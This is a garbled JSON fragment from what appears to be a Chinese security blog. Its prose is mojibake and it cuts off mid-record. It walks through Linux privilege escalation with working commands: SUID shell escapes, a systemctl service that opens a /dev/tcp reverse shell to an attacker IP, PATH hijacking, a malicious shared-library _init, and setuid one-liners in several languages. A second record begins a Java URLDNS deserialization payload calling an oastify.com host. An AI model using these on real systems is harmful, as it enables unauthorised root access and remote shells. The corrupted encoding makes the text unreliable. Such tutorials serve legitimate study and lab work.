å¦‚æœsuidé…ç½®ä¸å½“ï¼Œå¯èƒ½ä¼šå¯¼è‡´æƒé™æå‡ï¼ŒåŸç†ä¹Ÿæ˜¯åˆ©ç”¨è¢«èµ‹äºˆsuidæƒé™çš„æ–‡ä»¶å‘½ä»¤æ‰§è¡Œï¼Œè·å–ä¸€ä¸ªæ–°çš„é«˜æƒé™çš„shell\næˆ‘ä»¬ä»¥findå‘½ä»¤ä¸ºä¾‹é…ç½®ä¸€ä¸ªå®éªŒåœºæ™¯ï¼ˆchmod u+s /usr/bin/findå³å¯ï¼‰ï¼š\næˆ‘ä»¬ç°åœ¨çš„shellæ˜¯æ™®é€šç”¨æˆ·yuy0ungçš„èº«ä»½ï¼Œå°è¯•åˆ©ç”¨suidæ¥ææƒï¼š\né¦–å…ˆæŸ¥æ‰¾æ‰€æœ‰é…ç½®äº†suidæƒé™çš„æ–‡ä»¶ï¼š\nfind / -perm -4000 -type f -exec ls -la {} 2\u0026gt;/dev/null \\; è¿™é‡Œé€‰é¡¹å‚æ•°æ˜¯è¿™æ ·è®¾ç½®çš„ï¼š\n-type f: åªæŸ¥æ‰¾æ™®é€šæ–‡ä»¶ï¼Œæ’é™¤ç›®å½•ç­‰å…¶ä»–ç±»å‹çš„æ–‡ä»¶\n-exec ls -la {} 2\u0026gt;/dev/null ;: å¯¹æŸ¥æ‰¾åˆ°çš„æ–‡ä»¶æ‰§è¡Œ ls -la å‘½ä»¤ï¼Œ2\u0026gt;/dev/null è¡¨ç¤ºå°†æ ‡å‡†é”™è¯¯è¾“å‡ºé‡å®šå‘åˆ° /dev/nullï¼Œä»¥é¿å…æ˜¾ç¤ºä¸å¿…è¦çš„é”™è¯¯ä¿¡æ¯\n-permåŒ¹é…æƒé™ï¼š\n4000 2000 1000åˆ†åˆ«è¡¨ç¤ºSUID SGID SBIT 1.æ™®é€šæ–‡ä»¶ï¼Œæ–‡ä»¶çš„æƒé™ä¸€èˆ¬ä¸‰ä½ï¼Œ777æœ€é«˜æ–‡ä»¶æƒé™ -perm -0777æœç´¢çš„å°±æ˜¯æœ€é«˜æƒé™çš„æ–‡ä»¶rwxrwxrwx -perm +0777æœç´¢çš„åªè¦åŒ…å«rwxrwxrwxä»»æ„ä¸€ä¸ªçš„æ–‡ä»¶ 2.ç‰¹æ®Šæ–‡ä»¶ï¼ŒåŒ…å«æƒé™ä½ç½®å››ä½ï¼Œ7000ä¸ºæœ€é«˜ï¼Œå³â€“sâ€“sâ€“tï¼ŒåŒæ ·çš„æ–¹æ³• -perm -7000æœç´¢çš„å°±æ˜¯æœ€é«˜æƒé™çš„æ–‡ä»¶â€“sâ€“sâ€“t -perm +7000æœç´¢çš„åªè¦åŒ…å«â€“sâ€“sâ€“tä»»æ„ä¸€ä¸ªçš„æ–‡ä»¶ï¼Œâ€“s â€” â€”ï¼ˆ4000ï¼‰ã€â€” â€“s â€”ï¼ˆ2000ï¼‰ã€â€” â€” â€“tï¼ˆ1000ï¼‰ç­‰ æ ¹æ®æŸ¥æ‰¾ç»“æœå¯ä»¥çœ‹åˆ°/usr/bin/findè¢«èµ‹äºˆäº†suidæƒé™ï¼Œè€Œä»–çš„æ‰€æœ‰è€…ä¸ºrootï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·è·å–ä¸€ä¸ªrootæƒé™çš„shellï¼š\nfind /etc/passwd -exec /bin/bash -p \\; å¦‚æ­¤ï¼ŒæˆåŠŸæå‡åˆ°rootæƒé™\nåŒç†ï¼Œä¸åªfindå‘½ä»¤ï¼Œæœ‰å¾ˆå¤šèµ‹äºˆsuidæƒé™çš„æ–‡ä»¶å¯ä»¥è¾¾åˆ°æƒé™æå‡çš„æ•ˆæœ(å®é™…ä¸Šä¹Ÿå’Œrbashé€ƒé€¸ã€sudoææƒé‚£äº›è·å–shellçš„å‘½ä»¤ç›¸ä¼¼)ï¼Œè¿™é‡Œåˆ—ä¸¾å‡ ä¸ªï¼š\nsuidæ–‡ä»¶ ææƒå‘½ä»¤ /usr/bin/bash bash -p /usr/bin/csh csh -b /usr/bin/sh sh -p /usr/bin/ksh ksh -p /usr/bin/zsh zsh /usr/bin/find find /etc/passwd -exec /bin/bash -p ; /usr/bin/awk awk \u0026lsquo;BEGIN {system(\u0026quot;/bin/bash\u0026quot;)}\u0026rsquo; /usr/bin/man !/bin/bash /usr/bin/more !/bin/bash åˆ©ç”¨å‘½ä»¤å‡å¯åœ¨è¿™ä¸ªç½‘ç«™ä¸ŠæŸ¥è¯¢ï¼šGTFOBinsï¼Œè¿™é‡Œä¸å†èµ˜è¿°\nsuid systemctlææƒ systemctlæ˜¯ç”¨äºç®¡ç† Systemd çš„å‘½ä»¤è¡Œå·¥å…·ã€‚å½“systemctlè¢«é…ç½® SUID æƒé™æ—¶ï¼Œå¯ä»¥é€šè¿‡åˆ›å»º.service æ–‡ä»¶å®ç°æƒé™æå‡ï¼ˆæ„Ÿè§‰sudoä¹Ÿæ˜¯åŒç†ï¼‰\næ¥ä¸‹æ¥é€šè¿‡å®é™…æ“ä½œæ¼”ç¤ºæ­¥éª¤ï¼š\nç¯å¢ƒé…ç½® ä»¥rootèº«ä»½ç»™systemctlé…ç½®suidæƒé™ï¼š\nsudo chmod u+s /bin/systemctl å†åˆ‡æ¢åˆ°yuy0ungè¿›è¡Œåˆ©ç”¨\næ¼æ´åˆ©ç”¨ ä¿¡æ¯æ”¶é›†å¯çŸ¥systemctlæ‹¥æœ‰suidæƒé™\né¦–å…ˆåœ¨/tmpç›®å½•ç¼–å†™ä¸€ä¸ª service unitï¼ˆæœåŠ¡å•å…ƒï¼‰æ–‡ä»¶ç”¨æ¥è¢«systemctlåŠ è½½ï¼Œè¿™é‡Œå°†åå¼¹shellä»£ç å†™å…¥exp.serviceï¼š\necho \u0026#39;[Service] Type=oneshot ExecStart=/bin/bash -c \u0026#34;/bin/bash -i \u0026gt; /dev/tcp/192.168.111.132/4444 0\u0026gt;\u0026amp;1 2\u0026lt;\u0026amp;1\u0026#34; [Install] WantedBy=multi-user.target\u0026#39; \u0026gt; exp.service å°†å•å…ƒæ–‡ä»¶å¤åˆ¶åˆ°/dev/shmç›®å½•å¹¶ä½¿ç”¨systemctlåŠ è½½ï¼š\né»˜è®¤æƒ…å†µä¸‹ï¼Œsystemctl å‘½ä»¤æ˜¯åŠ è½½æ–‡æ¡£ä¸­æ‰€å†™çš„ /usr/lib/systemd/system/ æ–‡ä»¶å¤¹ï¼ˆæ­¤æ–‡ä»¶å¤¹åŒ…å«ç³»ç»Ÿé¢„å®šä¹‰çš„å•å…ƒæ–‡ä»¶ï¼‰å’Œ /etc/systemd/system/ æ–‡ä»¶å¤¹ï¼ˆæ­¤æ–‡ä»¶å¤¹åŒ…å«ç”¨æˆ·å®šä¹‰çš„å•å…ƒæ–‡ä»¶ï¼‰ã€‚ä¸è¿‡é€šå¸¸æµ‹è¯•äººå‘˜è·å–çš„ä½æƒé™è´¦å·æ˜¯ä¸å…·å¤‡è¿™ä¸¤ä¸ªç›®å½•å†™å…¥æƒé™çš„ã€‚ç”±äºä¸´æ—¶ç›®å½• /tmp ä¸­çš„å†…å®¹å¯èƒ½ä¼šè¢«éšæ—¶æ›´æ”¹æˆ–åˆ é™¤ï¼Œæ‰€ä»¥ systemctl ä¹Ÿæ— æ³•åŠ è½½ /tmp ç›®å½•ä¸­çš„æ–‡ä»¶ã€‚é‚£ä¹ˆè§£å†³æ–¹æ³•æ˜¯å°†æœåŠ¡å•å…ƒæ–‡ä»¶æ”¾ç½®åœ¨ /dev/shm æ–‡ä»¶å¤¹ï¼ˆLinux ä¸­çš„å…±äº«å†…å­˜æ–‡ä»¶ç³»ç»Ÿï¼Œç”¨äºå­˜æ”¾ä¸´æ—¶æ–‡ä»¶ï¼‰ä¸‹ï¼Œè¯¥æ–‡ä»¶å¤¹ä¸‹çš„å•å…ƒæ–‡ä»¶å¯ä»¥è¢« systemctl æ­£å¸¸åŠ è½½ä¸”ä»»æ„ç”¨æˆ·å¯å†™\ncp /tmp/exp.service /dev/shm/exp.service æ”»å‡»æœºç›‘å¬ï¼š\nä½¿ç”¨systemctlåŠ è½½æœåŠ¡å•å…ƒæ–‡ä»¶ï¼š\nsystemctl link /dev/shm/exp.service\t# å»ºç«‹é“¾æ¥ systemctl enable --now /dev/shm/exp.service\t#å¯åŠ¨æœåŠ¡ åŠ è½½åä¼šåå¼¹shell\næˆåŠŸè·å–rootæƒé™\n$PATHå˜é‡åŠ«æŒææƒ $PATH æ˜¯Linuxç³»ç»Ÿä¸­çš„ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼Œä¸windowsä¸‹çš„ Path ç¯å¢ƒå˜é‡çš„æ¦‚å¿µåŸºæœ¬ç›¸åŒ å®ƒçš„ä¸»è¦ä½œç”¨æ˜¯å½“ç”¨æˆ·æ‰§è¡Œå‘½ä»¤æ—¶ï¼Œç³»ç»Ÿä¼šæŒ‰ç…§$PATHå˜é‡ä¸­çš„è·¯å¾„è®¾ç½®ä¾æ¬¡å»å¯»æ‰¾å‘½ä»¤æ–‡ä»¶ä½ç½®ï¼Œæ‰§è¡Œæœ€å…ˆæ‰¾åˆ°çš„å‘½ä»¤æ–‡ä»¶ï¼Œå¯ä»¥æ ¹æ®è¿™ç§ç‰¹æ€§ï¼Œé€šè¿‡$PATHç¯å¢ƒå˜é‡åŠ«æŒæ¥è¿›è¡Œæƒé™æå‡\næ¥ä¸‹æ¥é€šè¿‡å®é™…æ“ä½œæ¼”ç¤ºæ­¥éª¤ï¼š\nç¯å¢ƒé…ç½® å…ˆåœ¨/home/yuy0ung/shellç›®å½•ä¸‹ç¼–è¾‘ä¸€ä¸ªdemo.cï¼š\ngccç¼–è¯‘ä¸ºshellæ–‡ä»¶ï¼š\ngcc demo.c -o shell èµ‹äºˆsuidæƒé™ï¼š\nå®Œæ¯•ï¼Œåˆ‡æ¢åˆ°yuy0ungå‡†å¤‡åˆ©ç”¨\næ¼æ´åˆ©ç”¨ é¦–å…ˆé€šè¿‡ä¿¡æ¯æ”¶é›†å‘ç°/home/yuy0ung/shell/shellæ‹¥æœ‰suidæƒé™\næ‰§è¡Œä¸€ä¸‹çœ‹çœ‹æ˜¯å¹²ä»€ä¹ˆçš„ï¼š\nè¿™ä¸å’Œpså·®ä¸å¤šå˜›\nç”¨xxdçœ‹çœ‹å†…å®¹æ˜¯ä¸æ˜¯æœ‰psï¼š\nxxd /home/yuy0ung/shell/shell | grep \u0026#34;ps\u0026#34;; è¿˜çœŸæ˜¯\næ‰€ä»¥ç¨‹åºæ‹¥æœ‰suidæƒé™ï¼Œè°ƒç”¨äº†pså‘½ä»¤ï¼Œé‚£ä¹ˆå¯ä»¥å°è¯•ç¯å¢ƒå˜é‡åŠ«æŒææƒ\nè¿™é‡Œæœ‰ä¸‰ç§æ€è·¯ï¼š\næ€è·¯1ï¼šåœ¨/tmpç›®å½•åˆ›å»ºä¸€ä¸ªpsæ–‡ä»¶ï¼Œå†…å®¹æ˜¯æ‰“å¼€ä¸€ä¸ªbashshell\necho \u0026#34;/bin/bash\u0026#34; \u0026gt; /tmp/ps \u0026amp;\u0026amp; chmod +x /tmp/ps æ€è·¯2ï¼šå°†/bin/bashæ–‡ä»¶å¤åˆ¶ä¸º/tmp/psæ–‡ä»¶\ncp /bin/bash /tmp/ps æ€è·¯3ï¼šå°†/bin/bashè½¯é“¾æ¥åˆ°/tmp/psæ–‡ä»¶\nln -s /bin/bash /tmp/ps è¿™é‡Œæˆ‘ä½¿ç”¨ç¬¬ä¸€ç§æ€è·¯ï¼š\næ¥ä¸‹æ¥æ˜¯æœ€å…³é”®çš„ä¸€æ­¥ï¼Œå°†/tmpåŠ å…¥$PATHç¯å¢ƒå˜é‡ï¼š\nexport PATH=/tmp:$PATH å¯ä»¥çœ‹è§/tmpåœ¨$PATHå˜é‡æœ€å‰é¢ï¼Œé‚£ä¹ˆç¨‹åºæ‰§è¡Œpsæ—¶ä¼šä¼˜å…ˆåœ¨/tmpç›®å½•å¯»æ‰¾ï¼Œå°±ä¼šæ‰§è¡Œ/tmp/psï¼Œè·å–ä¸€ä¸ªrootæƒé™çš„BashShellï¼š\nææƒæˆåŠŸ\nsoå…±äº«å¯¹è±¡åº“æ³¨å…¥ææƒ linuxçš„ç¨‹åºåº“æ˜¯ä¸€ç§ç‰¹æ®Šçš„ç¨‹åºæ–‡ä»¶ï¼Œç”¨äºå°†ä¸€äº›å¸¸ç”¨ä»£ç ã€å‡½æ•°ã€å˜é‡æ‰“åŒ…ï¼Œæ–¹ä¾¿å¤šä¸ªç¨‹åºå…±äº«è°ƒç”¨ï¼Œè€Œç¨‹åºåº“åˆ†ä¸ºä¸¤ç§ï¼š\né™æ€å‡½æ•°åº“ï¼š\nåœ¨ç¨‹åºç¼–è¯‘æ—¶ï¼Œç›´æ¥å°†åº“ä¸­çš„ä»£ç é“¾æ¥åˆ°ç›®æ ‡ç¨‹åºä¸­ï¼Œåœ¨linuxä¸­é€šå¸¸ä½¿ç”¨.aæˆ–.libæ‰©å±•å\nå…±äº«å‡½æ•°åº“ï¼š\nå³æˆ‘ä»¬ç†ŸçŸ¥çš„.soæ–‡ä»¶ï¼ŒåŒ…å«ç¼–è¯‘å¥½çš„ä»£ç ã€æ–‡ä»¶ï¼Œå¯åœ¨ç¨‹åºè¿è¡Œæ—¶åŠ è½½å’Œå¸è½½\nä¸€äº›å¼€å‘äººå‘˜ä¼šåœ¨ç¨‹åºä¸­æ‰‹åŠ¨æŒ‡å®šåŠ¨æ€åŠ è½½åº“çš„ä½ç½®æ¯”å¦‚ï¼šdlopen(\u0026quot;soæ–‡ä»¶è·¯å¾„\u0026quot;,RTLD_LAZY)ï¼Œè€Œå¦‚æœç¨‹åºè¢«é…ç½®äº†SUIDæƒé™ï¼Œä¸”åœ¨æ‰§è¡Œæ—¶æ²¡æœ‰æ‰¾åˆ°åº”è¯¥è¦åŠ è½½çš„åŠ¨æ€å‡½æ•°åº“ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä¼ªé€ ä¸€ä¸ªåŒååé—¨åº“æ–‡ä»¶ï¼Œè®©ç¨‹åºåŠ è½½æ­¤æ–‡ä»¶å®ç°ææƒï¼ŒåŸç†ç±»ä¼¼windowsçš„DLLåŠ«æŒ\nç¯å¢ƒé…ç½® ä»¥rootèº«ä»½è¿›è¡Œé…ç½®\nåˆ›å»ºä¸€ä¸ªæ–‡ä»¶/script/demo.cï¼š\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; int main() { // è¾“å‡º hello printf(\u0026#34;hello\\n\u0026#34;); // åŠ è½½å…±äº«åº“ void* handle = dlopen(\u0026#34;/tmp/demo.so\u0026#34;, RTLD_LAZY); if (!handle) { fprintf(stderr, \u0026#34;Cannot load library: %s\\n\u0026#34;, dlerror()); return 1; } // åœ¨è¿™é‡Œå¯ä»¥ä½¿ç”¨ dlsym æ¥è·å–åº“ä¸­çš„å‡½æ•° // å…³é—­å…±äº«åº“ dlclose(handle); return 0; } ç„¶ågccç¼–è¯‘ä¸ºè„šæœ¬æ–‡ä»¶ï¼š\ngcc demo.c -o demo èµ‹äºˆSUIDæƒé™ï¼š\nchmod 4755 demo åˆ‡æ¢åˆ°æ™®é€šç”¨æˆ·yuy0ungï¼Œæ¥ä¸‹æ¥è¿›è¡Œåˆ©ç”¨\næ¼æ´åˆ©ç”¨ ä¿¡æ¯æœé›†å‘ç°SUIDæƒé™æ–‡ä»¶ï¼š\nè¿™æ˜¯ä¸€ä¸ªç¼–è¯‘åçš„è„šæœ¬æ–‡ä»¶ï¼Œæ‰§è¡Œçœ‹çœ‹ï¼š\nå‘ç°è„šæœ¬å°è¯•åŠ è½½åº“æ–‡ä»¶/tmp/demo.soä½†æ˜¯åº“æ–‡ä»¶ä¸å­˜åœ¨\nå› ä¸ºåº“æ–‡ä»¶çš„ç›®å½•æ˜¯/tmpï¼Œä»»ä½•ç”¨æˆ·éƒ½å¯è¯»å†™ï¼Œå› æ­¤è€ƒè™‘åˆ¶ä½œä¸€ä¸ªåŒåsoæ–‡ä»¶æ¥getshell\nç¼–å†™ä¸€ä¸ª/tmp/demo.cï¼š\n#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; void _init(){ setresuid(0,0,0); system(\u0026#34;/bin/bash -p\u0026#34;); } gccç¼–è¯‘ä¸ºshell.soï¼Œä¸ä½¿ç”¨é»˜è®¤çš„å¯åŠ¨æ–‡ä»¶:\ngcc -shared -fPIC -o demo.so demo.c -nostartfiles æ¥ä¸‹æ¥å†æ‰§è¡Œä¸€æ¬¡/script/demoï¼Œè¿™é‡Œä¼šåŠ è½½æˆ‘ä»¬æ„é€ çš„soæ–‡ä»¶ï¼Œå®ç°ææƒï¼š\nCapabilitiesæœºåˆ¶ææƒ ä»linuxå†…æ ¸2.2å¼€å§‹å¼•å…¥äº†capabilitiesæœºåˆ¶ï¼Œè¿™æ˜¯ä¸€ç§æƒé™ç®¡ç†æœºåˆ¶ï¼Œç”¨äºç¡®å®šä¸€ä¸ªç¨‹åºæˆ–ç”¨æˆ·æ˜¯å¦å…·æœ‰æ‰§è¡ŒæŸé¡¹ç‰¹å®šæ“ä½œçš„æƒé™\nè¯¥æœºåˆ¶ç›¸æ¯”suidæ›´å®‰å…¨ï¼Œå¯ä»¥æ›´ç²¾ç»†åœ°æ§åˆ¶æƒé™ï¼Œä½¿ç¨‹åºåªèƒ½è·å¾—å®ƒæ‰€éœ€çš„æœ€å°æƒé™\nä½¿ç”¨è¯¥æœºåˆ¶æ—¶ï¼Œç³»ç»Ÿä¼šä½¿ç”¨ä¸€ä¸ªåˆ—è¡¨æ¥å­˜å‚¨ç¨‹åºåœ°capability setsï¼ˆèƒ½åŠ›é›†ï¼‰ï¼Œç¨‹åºåœ¨è¯·æ±‚è®¿é—®æŸä¸ªç³»ç»Ÿèµ„æºæ—¶ï¼Œç³»ç»Ÿä¼šæ£€æŸ¥è¯¥ç¨‹åºçš„capability setsï¼Œå¹¶æ ¹æ®å…¶ä¸­çš„capabilitiesæ¥å†³å®šæ˜¯å¦å…è®¸è®¿é—®\nè¿™é‡Œè¦æçš„capibiltyæ˜¯CAP_SETUIDï¼Œæ•ˆæœå³setuidï¼Œæ‰€ä»¥å¯èƒ½å­˜åœ¨æƒé™çš„é£é™©ï¼Œæ¥ä¸‹æ¥è¿›è¡Œåœºæ™¯å¤ç°\nç¯å¢ƒé…ç½® é¦–å…ˆä»¥rootèº«ä»½è¿›è¡Œé…ç½®\né¦–å…ˆæ‰¾åˆ°pythonæ–‡ä»¶çš„ä½ç½®ï¼š\nwhich python3 ç„¶åæ£€æŸ¥æ˜¯å¦æ˜¯ç¬¦å·é“¾æ¥ï¼š\nreadlink -f /usr/bin/python3 æ‰¾åˆ°åï¼Œè®¾ç½®cap_setuidï¼š\nsetcap cap_setuid=eip /usr/bin/python3.10 åˆ‡æ¢åˆ°yuy0ung\næ¼æ´åˆ©ç”¨ ä¿¡æ¯æ”¶é›†å‘ç°python3.10æœ‰cap_setuidèƒ½åŠ›ï¼š\ngetcap -r / 2\u0026gt;/dev/null å¦å¤–ï¼Œè¿™é‡Œpython3çš„cap_setuidæ ‡è®°äº†eï¼ˆeffectiveï¼‰å’Œpï¼ˆpermittedï¼‰ï¼Œå³æœ‰æ•ˆå’Œå…è®¸ï¼Œå³è¡¨ç¤ºè¯¥ç¨‹åºå…·æœ‰ä¿®æ”¹è¿›ç¨‹çš„æœ‰æ•ˆç”¨æˆ·IDçš„æƒé™ï¼Œæ‰€ä»¥æ„é€ python3å‘½ä»¤ï¼Œè°ƒç”¨setuidå°†è¿›ç¨‹çš„ç”¨æˆ·IDè®¾ç½®ä¸º0ï¼Œå¹¶æ‰§è¡Œ/bin/bashè·å–rootæƒé™çš„BashShellï¼š\npython3 -c \u0026#39;import os;os.setuid(0);os.system(\u0026#34;/bin/bash\u0026#34;)\u0026#39; åŒç†ï¼Œæœ‰å¾ˆå¤šæ–‡ä»¶éƒ½å¯ä»¥å®ç°è¿™ç§ææƒï¼š\næ–‡ä»¶ å‘½ä»¤ gbd gbd -nx -ex \u0026lsquo;python import os;os.setuid(0)\u0026rsquo; -ex \u0026lsquo;!sh\u0026rsquo; -ex quit node node -e \u0026lsquo;process.setuid(0);child_process.spawn(\u0026quot;/bin/bash\u0026quot;,{stdio:[0,1,2]})\u0026rsquo; php php -r \u0026ldquo;posix_setuid(0);system(\u0026rsquo;/bin/bash\u0026rsquo;);\u0026rdquo; ruby ruby -e \u0026lsquo;Process::Sys.setuid(0);exec \u0026ldquo;/bin/bash\u0026rdquo;\u0026rsquo; perl perl -e \u0026lsquo;use POSIX qw(setuid); POSIX::setuid(0);exec \u0026ldquo;/bin/bash\u0026rdquo;;\u0026rsquo; vim vim -c \u0026lsquo;:py import os;os.setuid(0);os.execl(\u0026quot;/bin/bash\u0026quot;,\u0026ldquo;sh\u0026rdquo;,\u0026quot;-c\u0026quot;,\u0026ldquo;reset;exec sh\u0026rdquo;)\u0026rsquo; å¦‚ä½•é˜²å¾¡ï¼Ÿ é’ˆå¯¹ä¸Šé¢æåˆ°çš„è¿™äº›ææƒæ‰‹æ®µï¼Œå¯ä»¥è¿›è¡Œå¦‚ä¸‹é˜²å¾¡ï¼š\nå®šæœŸå®¡æŸ¥ç³»ç»Ÿä¸­suidæƒé™æ–‡ä»¶çš„å®Œæ•´æ€§ï¼Œç¡®ä¿åªæœ‰æˆæƒäº†çš„ç”¨æˆ·ç»„å¯ä»¥æ‰§è¡Œ é™åˆ¶ç³»ç»Ÿä¸­é…ç½®suidæƒé™æ–‡ä»¶çš„æ•°é‡ï¼Œåªç»™å¿…è¦ç¨‹åºæˆæƒ æ­£ç¡®é…ç½®ç¯å¢ƒå˜é‡ å®šæœŸå®¡æŸ¥æ—¥å¿—ï¼Œåšå¥½åº”æ€¥å“åº” æ­£ç¡®é…ç½®ç¨‹åºä¸æ–‡ä»¶ ",
        "summary": "suidç›¸å…³ææƒæ€è·¯ SetUIDæ˜¯linuxçš„ä¸€ç§å®‰å…¨æœºåˆ¶ï¼Œå…è®¸ç”¨æˆ·åœ¨æ‰§è¡Œç‰¹å®šæ–‡ä»¶æ—¶æš‚æ—¶å°†å…¶æœ‰æ•ˆç”¨æˆ·IDæ”¹ä¸ºè¯¥æ–‡ä»¶æ‰€æœ‰è€…çš„ç”¨æˆ·IDã€‚è¿™æ ·ï¼Œå³ä½¿å½“å‰ç”¨æˆ·æ²¡æœ‰æ‰§è¡Œè¯¥æ–‡ä»¶çš„æƒé™ï¼Œä¹Ÿå¯ä»¥æ‰§è¡Œè¯¥æ–‡ä»¶ã€‚\nä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ä¸ºç›®æ ‡æ–‡ä»¶æ·»åŠ suidæƒé™ï¼š\nchmod u+s /etc/passwd æ³¨æ„ï¼š\nåªæœ‰å¯ä»¥æ‰§è¡Œçš„äºŒè¿›åˆ¶ç¨‹åºæ–‡ä»¶æ‰èƒ½è®¾å®šSUIDæƒé™,éäºŒè¿›åˆ¶æ–‡ä»¶è®¾ç½®SUIDæƒé™æ²¡ä»»ä½•æ„ä¹‰ å‘½ä»¤æ‰§è¡Œè€…è¦å¯¹è¯¥ç¨‹åºæ–‡ä»¶æ‹¥æœ‰æ‰§è¡Œ(x)æƒé™æ‰èƒ½ä½¿ç”¨ SUIDæƒé™åªåœ¨è¯¥ç¨‹åºæ‰§è¡Œè¿‡ç¨‹ä¸­æœ‰æ•ˆ,ä¹Ÿå°±æ˜¯è¯´èº«ä»½æ”¹å˜åªåœ¨ç¨‹åºæ‰§è¡Œè¿‡ç¨‹ä¸­æœ‰æ•ˆ suidé…ç½®ä¸å½“ææƒ å¦‚æœsuidé…ç½®ä¸å½“ï¼Œå¯èƒ½ä¼šå¯¼è‡´æƒé™æå‡ï¼ŒåŸç†ä¹Ÿæ˜¯åˆ©ç”¨è¢«èµ‹äºˆsuidæƒé™çš„æ–‡ä»¶å‘½ä»¤æ‰§è¡Œï¼Œè·å–ä¸€ä¸ªæ–°çš„é«˜æƒé™çš„shell\næˆ‘ä»¬ä»¥findå‘½ä»¤ä¸ºä¾‹é…ç½®ä¸€ä¸ªå®éªŒåœºæ™¯ï¼ˆchmod u+s /usr/bin/findå³å¯ï¼‰ï¼š\næˆ‘ä»¬ç°åœ¨çš„shellæ˜¯æ™®é€šç”¨æˆ·yuy0ungçš„èº«ä»½ï¼Œå°è¯•åˆ©ç”¨suidæ¥ææƒï¼š\né¦–å…ˆæŸ¥æ‰¾æ‰€æœ‰é…ç½®äº†suidæƒé™çš„æ–‡ä»¶ï¼š\nfind / -perm -4000 -type f -exec ls -la {} 2\u0026gt;/dev/null \\; è¿™é‡Œé€‰é¡¹å‚æ•°æ˜¯è¿™æ ·è®¾ç½®çš„ï¼š\n-type f: åªæŸ¥æ‰¾æ™®é€šæ–‡ä»¶ï¼Œæ’é™¤ç›®å½•ç­‰å…¶ä»–ç±»å‹çš„æ–‡ä»¶\n-exec ls -la {} 2\u0026gt;/dev/null ;: å¯¹æŸ¥æ‰¾åˆ°çš„æ–‡ä»¶æ‰§è¡Œ ls -la å‘½ä»¤ï¼Œ2\u0026gt;/dev/null è¡¨ç¤ºå°†æ ‡å‡†é”™è¯¯è¾“å‡ºé‡å®šå‘åˆ° /dev/nullï¼Œä»¥é¿å…æ˜¾ç¤ºä¸å¿…è¦çš„é”™è¯¯ä¿¡æ¯\n-permåŒ¹é…æƒé™ï¼š\n4000 2000 1000åˆ†åˆ«è¡¨ç¤ºSUID SGID SBIT 1.æ™®é€šæ–‡ä»¶ï¼Œæ–‡ä»¶çš„æƒé™ä¸€èˆ¬ä¸‰ä½ï¼Œ777æœ€é«˜æ–‡ä»¶æƒé™ -perm -0777æœç´¢çš„å°±æ˜¯æœ€é«˜æƒé™çš„æ–‡ä»¶rwxrwxrwx -perm +0777æœç´¢çš„åªè¦åŒ…å«rwxrwxrwxä»»æ„ä¸€ä¸ªçš„æ–‡ä»¶ 2.ç‰¹æ®Šæ–‡ä»¶ï¼ŒåŒ…å«æƒé™ä½ç½®å››ä½ï¼Œ7000ä¸ºæœ€é«˜ï¼Œå³â€“sâ€“sâ€“tï¼ŒåŒæ ·çš„æ–¹æ³• -perm -7000æœç´¢çš„å°±æ˜¯æœ€é«˜æƒé™çš„æ–‡ä»¶â€“sâ€“sâ€“t -perm +7000æœç´¢çš„åªè¦åŒ…å«â€“sâ€“sâ€“tä»»æ„ä¸€ä¸ªçš„æ–‡ä»¶ï¼Œâ€“s â€” â€”ï¼ˆ4000ï¼‰ã€â€” â€“s â€”ï¼ˆ2000ï¼‰ã€â€” â€” â€“tï¼ˆ1000ï¼‰ç­‰ æ ¹æ®æŸ¥æ‰¾ç»“æœå¯ä»¥çœ‹åˆ°/usr/bin/findè¢«èµ‹äºˆäº†suidæƒé™ï¼Œè€Œä»–çš„æ‰€æœ‰è€…ä¸ºrootï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·è·å–ä¸€ä¸ªrootæƒé™çš„shellï¼š\nfind /etc/passwd -exec /bin/bash -p \\; "
    }
,
    {
        "title": "URLDNSé“¾",
        "link": "/My-Knowlege-Database/blog/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B0%83%E7%94%A8%E9%93%BE/urldns%E9%93%BE/",
        "content": "URLDNSé“¾ æ¦‚è¿° URLDNSé“¾ï¼Œåœ¨ç›®æ ‡æ²¡æœ‰å›æ˜¾çš„æ—¶å€™ï¼Œèƒ½å¤Ÿé€šè¿‡DNSè¯·æ±‚å¾—çŸ¥æ˜¯å¦å­˜åœ¨ååºåˆ—åŒ–æ¼æ´\nå…¶ä¸­ HashMapç±»é‡å†™äº†readobject æ–¹æ³•ï¼Œreadobject æ–¹æ³•ä¼šè¯»å–ä¸€ä¸ªåºåˆ—åŒ–æ–‡ä»¶æµï¼š\nåœ¨ readObject æ–¹æ³•ä¸­çš„ putVal æ–¹æ³•ä¼šè°ƒç”¨ hash æ–¹æ³•\nhash æ–¹æ³•ä¸‹ä¼šè°ƒç”¨URLç±»çš„ hashCode æ–¹æ³•ï¼Œå½“ hashCode å±æ€§ä¸ç­‰äº-1ï¼Œä¼šè°ƒç”¨ handler.hashCode æ–¹æ³•\nç»§ç»­è·Ÿè¿›ä¼šè°ƒç”¨getHostAddress æ–¹æ³•\næœ€åè°ƒç”¨InetAddress.getByName æ–¹æ³•è§¦å‘DNSè¯·æ±‚\npayloadï¼š\npackage com.yuy0ung.fundamentals; import java.io.FileNotFoundException; import java.io.FileOutputStream; import java.io.IOException; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.net.URL; import java.util.HashMap; public class SerializationTest { public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.bin\u0026#34;)); oos.writeObject(obj); } public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException { Person person = new Person(\u0026#34;aa\u0026#34;, 22); HashMap\u0026lt;URL,Integer\u0026gt; hashmap = new HashMap\u0026lt;URL,Integer\u0026gt;(); //ä¸ºäº†ä¸è§¦å‘urlè¯·æ±‚ï¼Œä¿®æ”¹hashcodeä¸æ˜¯-1 URL url = new URL(\u0026#34;http://187ukw81mwpvmptw82esrl8yvp1hpadz.oastify.com\u0026#34;); Class c = url.getClass(); Field hashcodefield = c.getDeclaredField(\u0026#34;hashCode\u0026#34;); hashcodefield.setAccessible(true); hashcodefield.set(url,1234); hashmap.put(url, 1); 